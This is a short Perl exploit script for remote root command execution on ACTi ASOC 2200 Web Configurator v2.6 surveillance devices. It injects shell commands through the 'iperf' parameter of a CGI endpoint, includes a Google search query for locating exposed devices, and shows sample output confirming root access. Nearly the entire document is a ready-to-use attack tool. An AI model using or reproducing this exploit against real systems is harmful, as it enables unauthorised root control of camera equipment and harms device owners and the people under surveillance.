#!perl
#  ACTi ASOC 2200 Web Configurator <= v2.6 Remote Root Command Execution
##
#  Dicovery & Author: Todor Donev
#  Author mail: todor.donev@@gmail.com
#  Type: Hardware
#  Vuln Type and Risk: Remote / High
##
#  ACTi Corporation is the technology leader in IP surveillance,
#  focusing on multiple security surveillance market segments.
##
#  root@linux:~# perl actiroot.pl <CENSORED> 
#  [+] ACTi ASOC 2200 Web Configurator <= v2.6 Remote Root Command Execution
#  [+] Gewgl: intitle:"Web Configurator - Version v2.6"
#  # id
#   execute : /sbin/iperf -c ;id  &
#   uid=0(root) gid=0(root)        ### Got Root ? o.O
##
#  Special kind regards to Tsvetelina Emirska that support me !! :) 
#
#  Prayers to all the People in Japan from Bulgaria !!!!! 
#
use LWP::Simple; 
print "[+] ACTi ASOC 2200 Web Configurator <= v2.6 Remote Root Command Execution\n";
print "[+] Gewgl: intitle:\"Web Configurator - Version v2.6\"\n";
$host = $ARGV[0];
$cmd = $ARGV[1];
if(! $ARGV[0]) {
print "[+] usage: perl actiroot.pl <host> <cmd>\n";
exit;
}
if(! $ARGV[1]) {
$cmd = "id";
}
my $result = get("http://$host/cgi-bin/test?iperf=;$cmd &");
if (defined $result) {
print "# $cmd\n $result";
}
else {
print "[-] Not Vulnerable\n";
}